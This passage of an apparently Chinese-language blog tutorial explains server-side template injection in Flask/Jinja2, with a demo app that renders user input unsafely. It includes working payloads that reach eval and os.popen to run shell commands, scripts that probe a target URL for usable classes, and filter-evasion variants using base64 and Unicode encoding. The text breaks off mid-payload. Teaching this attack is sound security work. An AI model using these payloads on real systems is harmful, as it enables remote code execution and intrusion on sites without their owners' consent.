class="line-numbers language-pyhon" data-language="pyhon"><code class="language-pyhon">from flask import Flaskapp &#x3D; Flask(__name__)@app.route(&#39;&#x2F;user&#x2F;&lt;id&gt;&#39;, methods&#x3D;[&#39;DELETE&#39;])def delete_user(id):    # ... code to delete user ...    return &#39;User deleted successfully&#39;if __name__ &#x3D;&#x3D; &#39;__main__&#39;:    app.run(debug&#x3D;True,host&#x3D;&#39;0.0.0.0&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/97c43ec5172743e5b3b20c1f0095ccb8.png" alt="789"></p><h2 id="Flask模板介绍"><a href="#Flask模板介绍" class="headerlink" title="Flask模板介绍"></a>Flask模板介绍</h2><p>介绍：<a href="https://blog.csdn.net/weixin_42577686/article/details/124524571">Flask模板的介绍与使用</a><br><img src="https://img-blog.csdnimg.cn/2bb1224d9c574e6abbfbfa4cf27108f1.png" alt="46"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#app.py</span><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span>requestapp<span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    my_str<span class="token operator">=</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'ben'</span><span class="token punctuation">)</span>    my_int<span class="token operator">=</span><span class="token number">123</span>    my_array<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span>    my_dict<span class="token operator">=</span><span class="token punctuation">&#123;</span>        <span class="token string">'name'</span><span class="token punctuation">:</span><span class="token string">'daming'</span><span class="token punctuation">,</span>        <span class="token string">'age'</span><span class="token punctuation">:</span><span class="token number">18</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span>my_str<span class="token operator">=</span>my_str<span class="token punctuation">,</span>my_int<span class="token operator">=</span>my_int<span class="token punctuation">,</span>my_array<span class="token operator">=</span>my_array<span class="token punctuation">)</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">#创建一个目录templates，目录下创建文件index.html<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Title<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>模板html展示页面<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>&#123;&#123;my_str&#125;&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/38258db68de7475aa1b8956574a62d0c.png" alt="456"></p><h2 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h2><p><img src="https://img-blog.csdnimg.cn/a18c5bfd821244b4aa43c18c4d6fbbd2.png" alt="456"><br><img src="https://img-blog.csdnimg.cn/da03c4e385134b32b89dad29d09e8b47.png" alt="456"></p><h3 id="继承关系"><a href="#继承关系" class="headerlink" title="继承关系"></a>继承关系</h3><p><img src="https://img-blog.csdnimg.cn/977f7e20ead84e11ad7203444a349bbc.png" alt="456"><br>在 python 中，类之间是会有继承关系的，也就是派生类（子类）与基类（父类）的关系，这可以理解为父子关系。在这个父子关系中的最高级，就是 object 。也就是说，object 是祖宗类。<br>一般来说，SSTI 构造 payload 的思想，就是要通过各个数据类型 Numbers（数字）String（字符串）List（列表）Tuple（元组）Dictionary（字典） 这些子类，一直往上找到 object ，然后再通过找 object 类可以利用的子类。可以利用的子类，就是这个子类的方法（popen() eval()等方法）或属性可以利用。</p><p>写一个代码理解一下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">:</span><span class="token keyword">pass</span> <span class="token comment">#定义了一个名为A的空类</span><span class="token keyword">class</span> <span class="token class-name">B</span><span class="token punctuation">(</span>A<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">pass</span> <span class="token comment">#定义了一个名为B的类，它继承自A类</span><span class="token keyword">class</span> <span class="token class-name">C</span><span class="token punctuation">(</span>B<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">pass</span> <span class="token comment">#定义了一个名为C的类，它继承自B类</span><span class="token keyword">class</span> <span class="token class-name">D</span><span class="token punctuation">(</span>B<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">pass</span> <span class="token comment">#定义了一个名为D的类，它继承自B类</span>c<span class="token operator">=</span>C<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#创建了一个C类的实例c</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里将C类实例化为一个对象，打印出实例c的类对象</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>__class__<span class="token punctuation">)</span><span class="token comment"># __class__ 是一个特殊的属性，用于获取对象的类</span><span class="token comment">#结果&lt;class '__main__.C'></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">)</span><span class="token comment">#结果&lt;class '__main__.B'></span><span class="token keyword">print</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__base__<span class="token punctuation">)</span><span class="token comment">#结果&lt;class '__main__.A'></span><span class="token keyword">print</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__base__<span class="token punctuation">)</span><span class="token comment">#结果&lt;class 'object'></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最终指向就是Object<br>还有一种方法可以去显示出来</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">)</span><span class="token comment"># __mro__ 是一个特殊的属性，用于获取一个类或实例的方法解析顺序（Method Resolution Order</span><span class="token comment">#结果(&lt;class '__main__.C'>, &lt;class '__main__.B'>, &lt;class '__main__.A'>, &lt;class 'object'>)</span><span class="token keyword">print</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment">#结果 &lt;class '__main__.C'></span><span class="token keyword">print</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment">#结果 &lt;class '__main__.B'></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/a6a4c1b498844cbfa0315f7a38647fa1.png" alt="123"></p><h3 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h3><pre class="line-numbers language-text" data-language="text"><code class="language-text">__dict__ 保存类实例或对象实例的属性变量键值对字典__class__  返回类型所属的对象__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。__bases__   返回该对象所继承的基类// __base__和__mro__都是用来寻找基类的__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表__init__  类的初始化方法__globals__  对包含函数全局变量的字典的引用<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="检查漏洞"><a href="#检查漏洞" class="headerlink" title="检查漏洞"></a>检查漏洞</h3><p><img src="https://img-blog.csdnimg.cn/caeb1dcd2e444e3889a444e1dba2c909.png" alt="546"><br><img src="https://img-blog.csdnimg.cn/d6d9edfdac9a48c0a5d30ce2ceca4a32.png" alt="789"><br><img src="https://img-blog.csdnimg.cn/bdc2dafed414478985d6ed6fabec0e45.png" alt="456"></p><h3 id="常用注入模块"><a href="#常用注入模块" class="headerlink" title="常用注入模块"></a>常用注入模块</h3><p><img src="https://img-blog.csdnimg.cn/3dec8eda7ce74583aaae7bacab9cdb0d.png" alt="123"></p><h4 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h4><p>python脚本：POST提交”name“的值，通过for循环查找所需字符串</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl<span class="token operator">=</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入URL链接：'</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span><span class="token string">"&#123;&#123;().__class__.__base__.__subclasses__()["</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"]&#125;&#125;"</span><span class="token punctuation">&#125;</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        response<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token comment">#print(response.text)</span>        <span class="token keyword">if</span> response<span class="token punctuation">.</span>status_code<span class="token operator">==</span><span class="token number">200</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token string">'_frozen_importlib_external.FileLoader'</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>脚本灵活运用，按照实际情况修改<br><img src="https://img-blog.csdnimg.cn/75239b4fe04e4ce3b6eb5b55bc11f334.png" alt="123"><br><img src="https://img-blog.csdnimg.cn/df0ff4b811074b499ae0fef8df76734f.png" alt="123"><br><img src="https://img-blog.csdnimg.cn/306d33271c3341f68d9922a4f308591d.png" alt="123"><br><img src="https://img-blog.csdnimg.cn/eb63bef8c10341eea65da7ec1eb02690.png" alt="123"></p><h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><p>内建函数：python在执行脚本时自动加载的函数<br>脚本：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl<span class="token operator">=</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入URL链接：'</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span><span class="token string">"&#123;&#123;().__class.__base__.__subclasses__()["</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"].__init__.__globals__['__builtins__']&#125;&#125;"</span><span class="token punctuation">&#125;</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        response<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token comment">#print(response.text)</span>        <span class="token keyword">if</span> response<span class="token punctuation">.</span>status_code<span class="token operator">==</span><span class="token number">200</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token string">'eval'</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/6721439df92e49ac8f19f59ef2a72dee.png" alt="123"></p><p><code>&#123;&#123;self.__dict__._TemplateReference__context.keys()&#125;&#125;</code><br>显示出当前目录有哪些内置的对象和函数<br><img src="https://img-blog.csdnimg.cn/52affb08455e46979134e9f9007df484.png" alt="123"><br><img src="https://img-blog.csdnimg.cn/fb950d9977db4dbf8b5cdd198d375543.png" alt="123"><br><img src="https://img-blog.csdnimg.cn/3b890900c6e64a8cb894283d4f54549e.png" alt="456"><br><img src="https://img-blog.csdnimg.cn/8318ba4390ef4d55ba6180f9e3d72d71.png" alt="123"><br><img src="https://img-blog.csdnimg.cn/eb210962dd7946399de23043c7bcc9c2.png" alt="456"><br><img src="https://img-blog.csdnimg.cn/7e6bbbaf4ace4c32b4e022a06cb73dd6.png" alt="123"><br><img src="https://img-blog.csdnimg.cn/2f7da1b5b3e94582ba7e48918c73d01d.png" alt="123"></p><h3 id="绕过过滤双大括号"><a href="#绕过过滤双大括号" class="headerlink" title="绕过过滤双大括号"></a>绕过过滤双大括号</h3><p><img src="https://img-blog.csdnimg.cn/843f81905523465d81afb8d2ca8c14e7.png" alt="123"><br><img src="https://img-blog.csdnimg.cn/44f353805abf4973bc97d424f7055dc7.png" alt="123"><br><img src="https://img-blog.csdnimg.cn/9e890759aafd44ee880e1d2449eed86b.png" alt="456"></p><p><img src="https://img-blog.csdnimg.cn/0a11a96296bb45e8b97038bd17f989f4.png" alt="456"></p><h3 id="无回显SSTI"><a href="#无回显SSTI" class="headerlink" title="无回显SSTI"></a>无回显SSTI</h3><p><img src="https://img-blog.csdnimg.cn/82b05ea854bd43c4a6689747d03aaf90.png" alt="123"><br><img src="https://img-blog.csdnimg.cn/58f91b0ea44945efbea06531fa8d0c18.png" alt="123"><br><img src="https://img-blog.csdnimg.cn/d3ccb83ee5d84e29b3439bda5ccc472b.png" alt="789"></p><p><img src="https://img-blog.csdnimg.cn/672ebb6c2fc04b70a944b1a5adeb2000.png" alt="123"></p><h3 id="getitem绕过中括号过滤"><a href="#getitem绕过中括号过滤" class="headerlink" title="getitem绕过中括号过滤"></a>getitem绕过中括号过滤</h3><p> 正常使用<code>[]</code>时<br><code> &#123;&#123;''.__calss__.__base__.subclasses__()[117]&#125;&#125;</code><br>使用getitem绕过<br><code>&#123;&#123;''.__calss__.__base__.subclasses__().__getitem__(117)&#125;&#125;</code><br><img src="https://img-blog.csdnimg.cn/a9db3d6fefeb43b79b67cba773b9b35f.png" alt="123"></p><h3 id="request绕过单双引号过滤"><a href="#request绕过单双引号过滤" class="headerlink" title="request绕过单双引号过滤"></a>request绕过单双引号过滤</h3><p><img src="https://img-blog.csdnimg.cn/0498fbef7bdf44af8fb9901a42397b70.png" alt="123"><br><img src="https://img-blog.csdnimg.cn/0d25651fb09747b58d80bf62fd7a4924.png" alt="123"> <img src="https://img-blog.csdnimg.cn/4fa2f3bb6f31499ca1cd233021e76b3a.png" alt="123"><br><img src="https://img-blog.csdnimg.cn/b2a5b3fea2be4f459debf419da9c668d.png" alt="456"><br><img src="https://img-blog.csdnimg.cn/9725d59f92c6414fa6bf79e987ef8d41.png" alt="456"></p><h3 id="过滤器绕过下划线过滤"><a href="#过滤器绕过下划线过滤" class="headerlink" title="过滤器绕过下划线过滤"></a>过滤器绕过下划线过滤</h3><p><img src="https://img-blog.csdnimg.cn/c94604ff42234859be94be5fd95995d1.png" alt="123"><br><img src="https://img-blog.csdnimg.cn/9f77f111586a4a7bb36576882e392bd0.png" alt="789"><br><img src="https://img-blog.csdnimg.cn/e54f250d97794204bd0ea7a7a5358e8d.png" alt="456"><br><img src="https://img-blog.csdnimg.cn/a9ab18ed669941afa2e9ab7a3a000480.png" alt="123"><br><img src="https://img-blog.csdnimg.cn/b2605697c1f0494baff5ae23a6195692.png" alt="456"><br><img src="https://img-blog.csdnimg.cn/d50175a108264f048e38e4162bf25d2d.png" alt="789"><br><img src="https://img-blog.csdnimg.cn/766e77f05f154194bf82a7b2e5298e03.png" alt="789"><br><img src="https://img-blog.csdnimg.cn/2bcf11b047e348c8b4d36ddd1b71af40.png" alt="789"></p><h3 id="中括号绕过点过滤"><a href="#中括号绕过点过滤" class="headerlink" title="中括号绕过点过滤"></a>中括号绕过点过滤</h3><p><img src="https://img-blog.csdnimg.cn/07a73d95f15949b994c50dda1355bdaf.png" alt="789"></p><h3 id="绕过关键字过滤"><a href="#绕过关键字过滤" class="headerlink" title="绕过关键字过滤"></a>绕过关键字过滤</h3><p><img src="https://img-blog.csdnimg.cn/b02c0b719d1b4b40b62593daad6508cf.png" alt="456"><br><img src="https://img-blog.csdnimg.cn/b1ec1ebc3718402da007db1d5536e12a.png" alt="12"><br><img src="https://img-blog.csdnimg.cn/bc9d91b3c45e487ebe7d2383a52f3712.png" alt="456"><br><img src="https://img-blog.csdnimg.cn/3de5244222804c66bd3d90b90516d6d6.png" alt="789"><br><img src="https://img-blog.csdnimg.cn/2b1365da13f84927bcc32e37cbbf1943.png" alt="789"><br><img src="https://img-blog.csdnimg.cn/fd34e24cf8dc4bcf9ca6d47d4f506abe.png" alt="456"></p><h3 id="绕过数字过滤"><a href="#绕过数字过滤" class="headerlink" title="绕过数字过滤"></a>绕过数字过滤</h3><p>示例代码：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#app.py</span><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_templateapp<span class="token operator">=</span>Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">,</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">5000</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">index.html<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Title<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">        <span class="token selector">.a</span><span class="token punctuation">&#123;</span><span class="token property">color</span><span class="token punctuation">:</span> red<span class="token punctuation">;</span>        <span class="token property">font-weight</span><span class="token punctuation">:</span> bold<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>字符串个数：&#123;% set a='aaaaaaaaaa'|length*'aa'|length*'aaa'|length %&#125;&#123;&#123;a&#125;&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/3bcdac20b4a846b3945e7b554d5f895d.png" alt="789"><br><img src="https://img-blog.csdnimg.cn/b283f0cd960f429ca31a672895b41f01.png" alt="789"></p><h3 id="获取config文件"><a href="#获取config文件" class="headerlink" title="获取config文件"></a>获取config文件</h3><p><img src="https://img-blog.csdnimg.cn/096ab7cca0394d75830c6f465f6800c1.png" alt="789"><br><img src="https://img-blog.csdnimg.cn/a69000736d8e432f84ce4e62a303cd6f.png" alt="12"></p><h3 id="混合过滤绕过介绍"><a href="#混合过滤绕过介绍" class="headerlink" title="混合过滤绕过介绍"></a>混合过滤绕过介绍</h3><p><img src="https://img-blog.csdnimg.cn/231c722768454962b8d3b5b9360ae042.png" alt="789"><br><img src="https://img-blog.csdnimg.cn/28fd166d9ea84690a33cff39bad5ef03.png" alt="789"><br><img src="https://img-blog.csdnimg.cn/282904a4d77e4dbb85f30e50c7107eba.png" alt="123"><br><img src="https://img-blog.csdnimg.cn/106950159e194978829bfc6bc54bf80a.png" alt="789"><br><img src="https://img-blog.csdnimg.cn/d537cb382c8b4dda9f06968f8630da2f.png" alt="123"></p><h4 id="利用编码绕过"><a href="#利用编码绕过" class="headerlink" title="利用编码绕过"></a>利用编码绕过</h4><p>我们可以利用对关键字编码的方法，绕过关键字过滤，例如用base64编码绕过：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'X19idWlsdGluc19f'</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'base64'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'ZXZhbA=='</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'base64'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'X19pbXBvcnRfXygib3MiKS5wb3BlbigibHMgLyIpLnJlYWQoKQ=='</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'base64'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>等同于：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'__import__("os").popen("ls /").read()'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以看到，在payload中，只要是字符串的，即payload中引号内的，都可以用编码绕过。同理还可以进行rot13、16进制编码等。</p><h4 id="利用Unicode编码绕过关键字（flask适用）"><a href="#利用Unicode编码绕过关键字（flask适用）" class="headerlink" title="利用Unicode编码绕过关键字（flask适用）"></a>利用Unicode编码绕过关键字（flask适用）</h4><p>我们可以利用unicode编码的方法，绕过关键字过滤，例如：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'\u0065\u0076\u0061\u006c'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'__import__("os").popen("ls /").read()'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">77</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'\u006f\u0073'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'\u006c\u0073\u0020\u002f'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span 